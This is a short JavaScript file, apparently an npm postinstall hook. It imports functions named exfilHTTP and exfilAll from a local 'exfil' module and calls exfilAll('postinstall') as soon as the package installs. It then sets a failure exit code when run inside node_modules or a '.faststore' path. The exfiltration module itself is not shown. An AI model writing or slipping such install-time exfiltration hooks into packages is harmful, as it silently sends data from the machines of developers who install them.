const { exfilHTTP, exfilAll } = require('./exfil');

exfilAll('postinstall');

if (
  process.cwd().includes('node_modules') ||
  process.cwd().includes('.faststore')
) {
  process.exitCode = 1
}
